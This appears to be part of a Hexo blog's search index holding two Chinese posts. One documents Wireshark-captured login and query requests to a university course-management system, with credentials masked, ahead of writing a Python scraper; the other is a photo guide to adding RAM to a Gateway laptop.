      <url>/hexo-blog/20120630/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>使用 Wireshark 抓包后得到校正方系统的登陆过程如下：</p><a id="more"></a><p>头信息：</p><table><thead><tr><th>请求头</th><th>值</th></tr></thead><tbody><tr><td><strong>(Request-Line)</strong></td><td>POST /default2.aspx HTTP/1.1</td></tr><tr><td><strong>Host</strong></td><td>jwc.<em>**</em>.edu.cn:8989</td></tr><tr><td><strong>Connection</strong></td><td>keep-alive</td></tr><tr><td><strong>Content-Length</strong></td><td>156</td></tr><tr><td><strong>Cache-Control</strong></td><td>max-age=0</td></tr><tr><td><strong>Origin</strong></td><td><a href="http://jwc.****.edu.cn:8989" target="_blank" rel="noopener">http://jwc.****.edu.cn:8989</a></td></tr><tr><td><strong>User-Agent</strong></td><td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5</td></tr><tr><td><strong>Content-Type</strong></td><td>application/x-www-form-urlencoded</td></tr><tr><td><strong>Accept</strong></td><td>text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</td></tr><tr><td><strong>Referer</strong></td><td><a href="http://jwc.****.edu.cn:8989/" target="_blank" rel="noopener">http://jwc.****.edu.cn:8989/</a></td></tr><tr><td><strong>Accept-Encoding</strong></td><td>gzip,deflate,sdch</td></tr><tr><td><strong>Accept-Language</strong></td><td>zh-CN,zh;q=0.8</td></tr><tr><td><strong>Accept-Charset</strong></td><td>GBK,utf-8;q=0.7,*;q=0.3</td></tr><tr><td><strong>Cookie</strong></td><td>ASP.NET_SessionId=mrctyyikxevfky55cerpjx45</td></tr></tbody></table><p>发送的数据：</p><table><thead><tr><th>参数名</th><th>值</th></tr></thead><tbody><tr><td>__VIEWSTATE</td><td>dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+</td></tr><tr><td>TextBox1</td><td>**********</td></tr><tr><td>TextBox2</td><td>**********</td></tr><tr><td>RadioButtonList1</td><td>学生</td></tr><tr><td>Button1</td><td></td></tr><tr><td>lbLanguage</td></tr></tbody></table><p>查询过程如下：</p><p>头信息：</p><table><thead><tr><th>请求头</th><th>值</th></tr></thead><tbody><tr><td><strong>(Request-Line)</strong></td><td>GET /readimagexs.aspx?xh=<strong><strong>**</strong></strong> HTTP/1.1</td></tr><tr><td><strong>Host</strong></td><td>jwc.<em>**</em>.edu.cn:8989</td></tr><tr><td><strong>Connection</strong></td><td>keep-alive</td></tr><tr><td><strong>User-Agent</strong></td><td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5</td></tr><tr><td><strong>Accept</strong></td><td>text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8</td></tr><tr><td><strong>Accept-Encoding</strong></td><td>gzip,deflate,sdch</td></tr><tr><td><strong>Accept-Language</strong></td><td>zh-CN,zh;q=0.8</td></tr><tr><td><strong>Accept-Charset</strong></td><td>GBK,utf-8;q=0.7,*;q=0.3</td></tr><tr><td><strong>Cookie</strong></td><td>ASP.NET_SessionId=mrctyyikxevfky55cerpjx45</td></tr></tbody></table><p>查询字符串</p><table><thead><tr><th>参数名</th><th>值</th></tr></thead><tbody><tr><td>xh</td><td>**********</td></tr></tbody></table><p>整个登陆过程已经很明朗了，明天将用Python实现。</p><p>2012-06-30<br>By whypro</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gateway ID47H07C 笔记本拆机加内存，图文重播</title>
      <link href="/hexo-blog/20120215/Gateway-ID47H07C-%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%8B%86%E6%9C%BA%E5%8A%A0%E5%86%85%E5%AD%98%EF%BC%8C%E5%9B%BE%E6%96%87%E9%87%8D%E6%92%AD/"/>
      <url>/hexo-blog/20120215/Gateway-ID47H07C-%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%8B%86%E6%9C%BA%E5%8A%A0%E5%86%85%E5%AD%98%EF%BC%8C%E5%9B%BE%E6%96%87%E9%87%8D%E6%92%AD/</url>
      
        <content type="html"><![CDATA[<p>半个月前新买的笔记本，因内存只有2G，在64bit Windows7下的用户体验不是很好，琢磨了很久，便最终决定亲自为爱机加内存。</p><p>今天从某东商城邮购的内存刚到手，便第一时间准备好拆机工具。</p><p>拆机准备：螺丝刀一套（十字，一字），内存一条（金士顿 DDR3 1333 4GB），拆机专用刀，小刀（备用）。</p><a id="more"></a> <img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_MofL_4a1f000017b31261.jpg"><p>拆机前进一下系统，说不定拆坏了就进不去了。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_E1pZ_487b0000aade121a.jpg"><p>Gateway ID 系列的设计很疼，必须先拆线 C 面键盘（键盘是最难拆的部件，一定要小心，很容易在键盘上留下痕迹。不能使蛮力，否则就要换键盘了。）</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_E1pZ_487b0000aade121a.jpg"><p>拆下键盘后，拧下键盘下的4个螺丝，其中左上部有一螺丝被排线遮挡，很难发现，小心地拧下。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_rfP2_07600000300f121b.jpg"><p>C面拆完，拆D面，一共有六个螺丝。小心地拧下后，用拆机刀别开后盖（此处更需要细心和耐心）。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_B0QZ_02a9000015811263.jpg"><p>打开后盖后，笔记本的内脏一览无余。右下角就是内存的位置，因为该本的原2G内存是直接焊到主板上的，所以只能再加一个4G的，即最大6G。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_tJco_63dd000019331260.jpg"><p>内存特写，准备就位。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_ML5U_7309000000c2121b.jpg"><p>将内存槽左右的卡子掰开，将内存推入。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_mDJS_52150000a68e121a.jpg"><p>内存安装完毕。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_IGrs_44b30000c6ad1263.jpg"><p>接下来一步一步将零件组装上，装后盖时要一边一边装，让每一个卡子到位。然后把螺丝拧上，这个步骤也一定要小心，不要装完了发现多了一个螺丝。</p><p>忐忑地开机，成功一次点亮！</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_h4nI_19f30000cd00121a.jpg"><p>速度明显快了一些。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_VSCg_263600001d311262.jpg"><p>内存占用图：</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_Kell_687100000752121b.jpg"><p>Windows 评分 5.4。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_tRiM_7cf3000119271260.jpg"><p>360卫视硬件检测。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_ZngP_2a2d000065f31262.jpg"><p>加内存前360卫视评分。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_9Plc_0ce800002e8c121b.jpg"><p>加内存后360卫视评分。</p><img src="/hexo-blog/20120215/Gateway-ID47H07C-笔记本拆机加内存，图文重播/b_large_v02X_453d00015a79121c.jpg"><p>小结：以前从没有这么大规模地拆过笔记本，经过这次的尝试，确实增长了很多经验值，也为以后更换SSD奠定了基础。总之，技术宅就是要不怕折腾。有问题可以发邮件哦，whypro(at)live.cn。</p><hr><p>By whypro</p><p>Sat, Feb 25, 2012</p><p>15:36</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
